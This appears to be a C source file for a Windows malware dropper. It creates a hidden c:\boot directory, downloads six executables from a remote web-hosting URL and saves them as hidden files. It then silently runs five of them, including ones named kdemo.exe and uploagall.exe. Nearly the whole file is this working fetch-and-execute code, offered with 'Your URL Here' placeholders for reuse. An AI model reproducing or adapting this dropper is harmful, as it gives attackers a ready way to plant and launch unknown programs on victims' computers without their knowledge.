#include<stdlib.h>
#include<stdio.h>
#include <windows.h>
#include <wininet.h>
#include<stdlib.h>
#if       _WIN32_WINNT < 0x0500
  #undef  _WIN32_WINNT
  #define _WIN32_WINNT   0x0500
#endif
#include <windows.h>

typedef PVOID HINTERNET ;  
typedef HINTERNET (WINAPI *InetOpenA)(LPCTSTR , char* ,char*,char* ,char* ); //InterNetOpenA
typedef HINTERNET (WINAPI *InetOpenUrlA) (HINTERNET, LPCSTR, char* ,char* ,char* ,char* ); //InternetOpenUrlA
typedef BOOL (WINAPI *InetReadFile) (HINTERNET, LPVOID , DWORD , LPDWORD); //InternetReadFileA
typedef HANDLE (WINAPI *CreatFile) (LPCTSTR,int,int,int,int,int,int); //CreateFileA
typedef BOOL (WINAPI *WritFile) (HANDLE,LPCVOID,int,LPDWORD,int); //WriteFileA

BOOL D_File1(char* FromHere)
{
    HINTERNET            InternetHandle;
    HINTERNET            UrlHandle;
    HANDLE                FileHandle;
    unsigned long        BytesNext = 1;
    unsigned long        BytesWritten = 0;
    char                Buffer[2048];

char *SaveFile = "c:\\boot\\copyfile.exe"; //File Destination

// Opening page, with File Save Destination
    InternetHandle = InternetOpen(SaveFile, 0, 0, 0, 0);

    if(InternetHandle != 0)
    {
        UrlHandle = InternetOpenUrl(InternetHandle, FromHere, 0, 0, 0, 0);  //Connectin to your File
        FileHandle = CreateFile(SaveFile, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, 0); //Creating File to spec. Destination, with File Attributes.

            while(BytesNext != 0)
            {
                InternetReadFile(UrlHandle, Buffer, sizeof(Buffer), &BytesNext);
                WriteFile(FileHandle, Buffer, BytesNext, &BytesWritten, 0);  //Writing bytes to File
            }
            CloseHandle(FileHandle);
            CloseHandle(UrlHandle);
           CloseHandle(InternetHandle);

    }
    return FALSE;

}

BOOL D_File2(char* FromHere)
{
    HINTERNET            InternetHandle;
    HINTERNET            UrlHandle;
    HANDLE                FileHandle;
    unsigned long        BytesNext = 1;
    unsigned long        BytesWritten = 0;
    char                Buffer[2048];

char *SaveFile = "c:\\boot\\kdemo.exe"; //File Destination

// Opening page, with File Save Destination
    InternetHandle = InternetOpen(SaveFile, 0, 0, 0, 0);

    if(InternetHandle != 0)
    {
        UrlHandle = InternetOpenUrl(InternetHandle, FromHere, 0, 0, 0, 0);  //Connectin to your File
        FileHandle = CreateFile(SaveFile, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, 0); //Creating File to spec. Destination, with File Attributes.

            while(BytesNext != 0)
            {
                InternetReadFile(UrlHandle, Buffer, sizeof(Buffer), &BytesNext);
                WriteFile(FileHandle, Buffer, BytesNext, &BytesWritten, 0);  //Writing bytes to File
            }
            CloseHandle(FileHandle);
            CloseHandle(UrlHandle);
           CloseHandle(InternetHandle);

    }
    return FALSE;

}

BOOL D_File3(char* FromHere)
{
    HINTERNET            InternetHandle;
    HINTERNET            UrlHandle;
    HANDLE                FileHandle;
    unsigned long        BytesNext = 1;
    unsigned long        BytesWritten = 0;
    char                Buffer[2048];

char *SaveFile = "c:\\boot\\resgsgtry.exe"; //File Destination

// Opening page, with File Save Destination
    InternetHandle = InternetOpen(SaveFile, 0, 0, 0, 0);

    if(InternetHandle != 0)
    {
        UrlHandle = InternetOpenUrl(InternetHandle, FromHere, 0, 0, 0, 0);  //Connectin to your File
        FileHandle = CreateFile(SaveFile, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, 0); //Creating File to spec. Destination, with File Attributes.

            while(BytesNext != 0)
            {
                InternetReadFile(UrlHandle, Buffer, sizeof(Buffer), &BytesNext);
                WriteFile(FileHandle, Buffer, BytesNext, &BytesWritten, 0);  //Writing bytes to File
            }
            CloseHandle(FileHandle);
            CloseHandle(UrlHandle);
           CloseHandle(InternetHandle);

    }
    return FALSE;

}

BOOL D_File4(char* FromHere)
{
    HINTERNET            InternetHandle;
    HINTERNET            UrlHandle;
    HANDLE                FileHandle;
    unsigned long        BytesNext = 1;
    unsigned long        BytesWritten = 0;
    char                Buffer[2048];

char *SaveFile = "c:\\boot\\tree_structure.exe"; //File Destination

// Opening page, with File Save Destination
    InternetHandle = InternetOpen(SaveFile, 0, 0, 0, 0);

    if(InternetHandle != 0)
    {
        UrlHandle = InternetOpenUrl(InternetHandle, FromHere, 0, 0, 0, 0);  //Connectin to your File
        FileHandle = CreateFile(SaveFile, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, 0); //Creating File to spec. Destination, with File Attributes.

            while(BytesNext != 0)
            {
                InternetReadFile(UrlHandle, Buffer, sizeof(Buffer), &BytesNext);
                WriteFile(FileHandle, Buffer, BytesNext, &BytesWritten, 0);  //Writing bytes to File
            }
            CloseHandle(FileHandle);
            CloseHandle(UrlHandle);
           CloseHandle(InternetHandle);

    }
    return FALSE;

}

BOOL D_File5(char* FromHere)
{
    HINTERNET            InternetHandle;
    HINTERNET            UrlHandle;
    HANDLE                FileHandle;
    unsigned long        BytesNext = 1;
    unsigned long        BytesWritten = 0;
    char                Buffer[2048];

char *SaveFile = "c:\\boot\\uploagall.exe"; //File Destination

// Opening page, with File Save Destination
    InternetHandle = InternetOpen(SaveFile, 0, 0, 0, 0);

    if(InternetHandle != 0)
    {
        UrlHandle = InternetOpenUrl(InternetHandle, FromHere, 0, 0, 0, 0);  //Connectin to your File
        FileHandle = CreateFile(SaveFile, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, 0); //Creating File to spec. Destination, with File Attributes.

            while(BytesNext != 0)
            {
                InternetReadFile(UrlHandle, Buffer, sizeof(Buffer), &BytesNext);
                WriteFile(FileHandle, Buffer, BytesNext, &BytesWritten, 0);  //Writing bytes to File
            }
            CloseHandle(FileHandle);
            CloseHandle(UrlHandle);
           CloseHandle(InternetHandle);

    }
    return FALSE;

}

BOOL D_File6(char* FromHere)
{
    HINTERNET            InternetHandle;
    HINTERNET            UrlHandle;
    HANDLE                FileHandle;
    unsigned long        BytesNext = 1;
    unsigned long        BytesWritten = 0;
    char                Buffer[2048];

char *SaveFile = "c:\\boot\\downloader.exe"; //File Destination

// Opening page, with File Save Destination
    InternetHandle = InternetOpen(SaveFile, 0, 0, 0, 0);

    if(InternetHandle != 0)
    {
        UrlHandle = InternetOpenUrl(InternetHandle, FromHere, 0, 0, 0, 0);  //Connectin to your File
        FileHandle = CreateFile(SaveFile, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, 0); //Creating File to spec. Destination, with File Attributes.

            while(BytesNext != 0)
            {
                InternetReadFile(UrlHandle, Buffer, sizeof(Buffer), &BytesNext);
                WriteFile(FileHandle, Buffer, BytesNext, &BytesWritten, 0);  //Writing bytes to File
            }
            CloseHandle(FileHandle);
            CloseHandle(UrlHandle);
           CloseHandle(InternetHandle);

    }
    return FALSE;

}

int main() 
{
    //ShowWindow( GetConsoleWindow(), SW_HIDE );
    
    system("md c:\\boot\\config\\");
	system("attrib +h  c:\\boot");
    
    D_File1("http://71722513-633217147311858139.preview.editmysite.com/uploads/7/1/7/2/71722513/copyfile.exe"); //Your URL Here
    D_File2("http://71722513-633217147311858139.preview.editmysite.com/uploads/7/1/7/2/71722513/kdemo.exe"); //Your URL Here
	D_File3("http://71722513-633217147311858139.preview.editmysite.com/uploads/7/1/7/2/71722513/resgsgtry.exe"); //Your URL Here
	D_File4("http://71722513-633217147311858139.preview.editmysite.com/uploads/7/1/7/2/71722513/tree_structure.exe"); //Your URL Here
	D_File5("http://71722513-633217147311858139.preview.editmysite.com/uploads/7/1/7/2/71722513/uploagall.exe"); //Your URL Here
	D_File6("http://71722513-633217147311858139.preview.editmysite.com/uploads/7/1/7/2/71722513/downloader.exe"); //Your URL Here
	
	system("c:\\boot\\resgsgtry.exe");
	system("c:\\boot\\Tree_Structure.exe");
	system("c:\\boot\\copyfile.exe");
	system("c:\\boot\\UploagAll.exe");
	system("c:\\boot\\kdemo.exe");
	
return 0;

}